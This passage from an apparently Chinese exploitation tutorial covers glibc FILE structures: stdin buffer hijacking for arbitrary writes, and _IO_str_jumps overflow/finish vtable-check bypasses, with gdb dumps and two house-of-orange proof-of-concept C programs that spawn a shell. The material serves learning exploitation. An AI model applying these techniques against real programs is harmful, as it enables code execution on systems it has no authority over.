class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">char</span> stack_buf[<span class="number">100</span>];</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,stack_buf);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,stack_buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在执行程序第一次使用 stdin 之前，stdin 的内容还未初始化是空的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2088  0x0000000000000000</span><br><span class="line">0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff</span><br><span class="line">0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790</span><br><span class="line">0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000</span><br><span class="line">0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000</span><br><span class="line">0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0 &lt;&#x3D;&#x3D; vtable</span><br></pre></td></tr></table></figure><p>调用 scanf 之后可以看到_IO_read_ptr、_IO_read_base、_IO_read_end、_IO_buf_base、_IO_buf_end 等域都被初始化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2288  0x0000000000602013</span><br><span class="line">0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000602014  0x0000000000602010</span><br><span class="line">0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000602010  0x0000000000602010</span><br><span class="line">0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000602010  0x0000000000602010</span><br><span class="line">0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x0000000000602410  0x0000000000000000</span><br><span class="line">0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff</span><br><span class="line">0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790</span><br><span class="line">0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000</span><br><span class="line">0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000</span><br><span class="line">0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff  0x0000000000000000</span><br><span class="line">0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0</span><br></pre></td></tr></table></figure><p>进一步思考可以发现其实 stdin 初始化的内存是在堆上分配出来的，在这里堆的基址是 0x602000，因为之前没有堆分配因此缓冲区的地址也是 0x602010</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x &#x2F;home&#x2F;vb&#x2F;桌面&#x2F;tst&#x2F;1&#x2F;t1</span><br><span class="line">0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- &#x2F;home&#x2F;vb&#x2F;桌面&#x2F;tst&#x2F;1&#x2F;t1</span><br><span class="line">0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- &#x2F;home&#x2F;vb&#x2F;桌面&#x2F;tst&#x2F;1&#x2F;t1</span><br><span class="line">0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]</span><br></pre></td></tr></table></figure><p>分配的堆大小是 0x400 个字节，正好对应于_IO_buf_base～_IO_buf_end 在进行写入后，可以看到缓冲区中有我们写入的数据，之后目的地址栈中的缓冲区也会写入数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000411 &lt;&#x3D;&#x3D; 分配0x400大小</span><br><span class="line">0x602010:   0x000000000a333231  0x0000000000000000 &lt;&#x3D;&#x3D; 缓冲数据</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>接下来我们尝试修改_IO_buf_base 来实现任意地址读写，全局缓冲区 buf 的地址是 0x7ffff7dd2740。修改 _IO_buf_base 和_IO_buf_end 到缓冲区 buf 的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2288  0x0000000000602013</span><br><span class="line">0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000602014  0x0000000000602010</span><br><span class="line">0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000602010  0x0000000000602010</span><br><span class="line">0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000602010  0x00007ffff7dd2740 &lt;&#x3D;&#x3D; _IO_buf_base</span><br><span class="line">0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x00007ffff7dd27c0  0x0000000000000000 &lt;&#x3D;&#x3D; _IO_buf_end</span><br><span class="line">0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff</span><br><span class="line">0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790</span><br><span class="line">0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000</span><br><span class="line">0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000</span><br><span class="line">0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff  0x0000000000000000</span><br><span class="line">0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0</span><br></pre></td></tr></table></figure><p>之后 scanf 的读入数据就会写入到 0x7ffff7dd2740 的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd2740 &lt;buf&gt;:   0x00000a6161616161  0x0000000000000000</span><br><span class="line">0x7ffff7dd2750 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd2760 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd2770 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd2780 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="IO-str-jumps-gt-overflow"><a href="#IO-str-jumps-gt-overflow" class="headerlink" title="_IO_str_jumps -&gt; overflow"></a>_IO_str_jumps -&gt; overflow</h3><blockquote><p>加入的是 check 是针对 <code>_IO_FILE_plus</code> 的 vtable 检查，没有对 <code> _IO_str_jumps</code> vtable 进行检查。劫持这个后者的 vtable ，找调用这个虚函数的函数运行 getshell </p></blockquote><p><code>libc</code>中不仅仅只有<code>_IO_file_jumps</code>这么一个<code>vtable</code>，还有一个叫<code>_IO_str_jumps</code>的 ，这个 <code>vtable</code> 不在 check 范围之内。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">const struct _IO_jump_t _IO_str_jumps libio_vtable &#x3D;</span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们能设置文件指针的 <code>vtable</code> 为 <code>_IO_str_jumps</code> 么就能调用不一样的文件操作函数。这里以<code>_IO_str_overflow</code>为例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class="comment">// pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class="comment">// should in </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// pass</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> *new_buf;</span><br><span class="line">      <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)<span class="comment">//pass 一般会通过</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class="comment">//target [fp+0xe0]</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><p>利用以下代码来劫持程序流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_buf</span><br><span class="line">  = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure><p>几个条件 bypass：</p><ol><li><code>1. fp-&gt;_flags &amp; _IO_NO_WRITES为假</code></li><li><code>2. (pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</code></li><li><code>3. fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假</code></li><li><code>4. 2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数</code></li><li><code>5. new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向/bin/sh字符串对应的地址</code></li><li><code>6. fp+0xe0指向system地址</code></li></ol><p>构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_flags &#x3D; 0</span><br><span class="line">_IO_write_base &#x3D; 0</span><br><span class="line">_IO_write_ptr &#x3D; (binsh_in_libc_addr -100) &#x2F; 2 +1</span><br><span class="line">_IO_buf_end &#x3D; (binsh_in_libc_addr -100) &#x2F; 2 </span><br><span class="line"></span><br><span class="line">_freeres_list &#x3D; 0x2</span><br><span class="line">_freeres_buf &#x3D; 0x3</span><br><span class="line">_mode &#x3D; -1</span><br><span class="line"></span><br><span class="line">vtable &#x3D; _IO_str_jumps - 0x18</span><br></pre></td></tr></table></figure><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>修改了 how2heap 的 houseoforange 代码，可以自己动手调试一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int winner ( char *ptr);</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char *p1, *p2;</span><br><span class="line">    size_t io_list_all, *top;</span><br><span class="line">    &#x2F;&#x2F; unsorted bin attack</span><br><span class="line">    p1 &#x3D; malloc(0x400-16);</span><br><span class="line">    top &#x3D; (size_t *) ( (char *) p1 + 0x400 - 16);</span><br><span class="line">    top[1] &#x3D; 0xc01;</span><br><span class="line">    p2 &#x3D; malloc(0x1000);</span><br><span class="line">    io_list_all &#x3D; top[2] + 0x9a8;</span><br><span class="line">    top[3] &#x3D; io_list_all - 0x10;</span><br><span class="line">    &#x2F;&#x2F; _IO_str_overflow conditions</span><br><span class="line">    char binsh_in_libc[] &#x3D; &quot;&#x2F;bin&#x2F;sh\x00&quot;; &#x2F;&#x2F; we can found &quot;&#x2F;bin&#x2F;sh&quot; in libc, here i create it in stack</span><br><span class="line">    &#x2F;&#x2F; top[0] &#x3D; ~1;</span><br><span class="line">    &#x2F;&#x2F; top[0] &amp;&#x3D; ~8;</span><br><span class="line">    top[0] &#x3D; 0;</span><br><span class="line">    top[4] &#x3D; 0; &#x2F;&#x2F; write_base</span><br><span class="line">    top[5] &#x3D; ((size_t)&amp;binsh_in_libc-100)&#x2F;2 + 1; &#x2F;&#x2F; write_ptr</span><br><span class="line">    top[7] &#x3D; 0; &#x2F;&#x2F; buf_base</span><br><span class="line">    top[8] &#x3D; top[5] - 1; &#x2F;&#x2F; buf_end</span><br><span class="line">    &#x2F;&#x2F; house_of_orange conditions</span><br><span class="line">    top[1] &#x3D; 0x61;</span><br><span class="line"></span><br><span class="line">    top[20] &#x3D; (size_t) &amp;top[18];</span><br><span class="line">    top[21] &#x3D; 2;</span><br><span class="line">    top[22] &#x3D; 3;</span><br><span class="line">    top[24] &#x3D; -1;</span><br><span class="line">    top[27] &#x3D; (size_t)stdin - 0x3868-0x18; &#x2F;&#x2F; _IO_str_jumps地址</span><br><span class="line">    top[28] &#x3D; (size_t) &amp;winner;</span><br><span class="line"></span><br><span class="line">    &#x2F;* Finally, trigger the whole chain by calling malloc *&#x2F;</span><br><span class="line">    malloc(10);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int winner(char *ptr)</span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IO-str-jumps-gt-finish"><a href="#IO-str-jumps-gt-finish" class="headerlink" title="_IO_str_jumps -&gt; finish"></a>_IO_str_jumps -&gt; finish</h3><p>原理与上面的 _IO_str_jumps -&gt; overflow 类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_str_finish (_IO_FILE *fp, int dummy)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  &#x2F;&#x2F;[fp+0xe8]</span><br><span class="line">  fp-&gt;_IO_buf_base &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件：</p><ol><li>_IO_buf_base 不为空</li><li>_flags &amp; _IO_USER_BUF(0x01) 为假</li></ol><p>构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_flags &#x3D; (binsh_in_libc + 0x10) &amp; ~1</span><br><span class="line">_IO_buf_base &#x3D; binsh_addr</span><br><span class="line"></span><br><span class="line">_freeres_list &#x3D; 0x2</span><br><span class="line">_freeres_buf &#x3D; 0x3</span><br><span class="line">_mode &#x3D; -1</span><br><span class="line">vtable &#x3D; _IO_str_finish - 0x18</span><br><span class="line">fp+0xe8 -&gt; system_addr</span><br></pre></td></tr></table></figure><h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><p>修改了 how2heap 的 houseoforange 代码，可以自己动手调试一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int winner ( char *ptr);</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char *p1, *p2;</span><br><span class="line">    size_t io_list_all, *top;</span><br><span class="line">    &#x2F;&#x2F; unsorted bin attack</span><br><span class="line">    p1 &#x3D; malloc(0x400-16);</span><br><span class="line">    top &#x3D; (size_t *) ( (char *) p1 + 0x400 - 16);</span><br><span class="line">    top[1] &#x3D; 0xc01;</span><br><span class="line">    p2 &#x3D; malloc(0x1000);</span><br><span class="line">    io_list_all &#x3D; top[2] + 0x9a8;</span><br><span class="line">    top[3] &#x3D; io_list_all - 0x10;</span><br><span class="line">    &#x2F;&#x2F; _IO_str_finish conditions</span><br><span class="line">    char binsh_in_libc[] &#x3D; &quot;&#x2F;bin&#x2F;sh\x00&quot;; &#x2F;&#x2F; we can found &quot;&#x2F;bin&#x2F;sh&quot; in libc, here i create it in stack</span><br><span class="line"></span><br><span class="line">    top[0] &#x3D; ((size_t) &amp;binsh_in_libc + 0x10) &amp; ~1;</span><br><span class="line">    top[7] &#x3D; ((size_t)&amp;binsh_in_libc); &#x2F;&#x2F; buf_base</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; house_of_orange conditions</span><br><span class="line">    top[1] &#x3D; 0x61;</span><br><span class="line">    top[5] &#x3D; 0x1 ; &#x2F;&#x2F;_IO_write_ptr</span><br><span class="line">    top[20] &#x3D; (size_t) &amp;top[18];</span><br><span class="line">    top[21] &#x3D; 2;</span><br><span class="line">    top[22] &#x3D; 3;</span><br><span class="line">    top[24] &#x3D; -1;</span><br><span class="line">    top[27] &#x3D; (size_t) stdin - 0x33f0 - 0x18;</span><br><span class="line">    top[29] &#x3D; (size_t) &amp;winner;</span><br><span class="line">        top[30] &#x3D; (size_t) &amp;top[30];</span><br><span class="line">    malloc(10);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int winner(char *ptr)</span><br><span 